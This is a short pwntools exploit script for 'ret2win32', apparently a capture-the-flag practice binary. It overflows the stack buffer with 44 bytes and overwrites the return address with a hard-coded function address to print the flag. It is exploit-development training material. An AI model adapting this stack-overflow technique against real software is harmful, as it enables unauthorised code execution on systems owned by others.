  GNU nano 4.5                                  exploit.py                                            
#!/usr/bin/python

from pwn import *
import re

ret2win = '\x2c\x86\x04\x08'

r = process("./ret2win32")

#Take the PID of the proccess for the GDB
pid=r.pid
print(r.pid)
print()

input()

conn =  r.recvuntil("buffer!")
print(conn)
print()

conn =  r.recvuntil("wrong?")
print(conn)
print()

conn =  r.recvuntil("read()!")
print(conn)
print()

#Create payload 44 bytes plus the ret2win funciton address and send it
payload = 'A' * 40 + 'BBBB'
payload += ret2win
r.sendline(payload)

conn = r.recvuntil("flag:")
#conn = r.recvuntil("you!")
print(conn)
print()

flag = r.recvuntil("flag!")
print(flag)
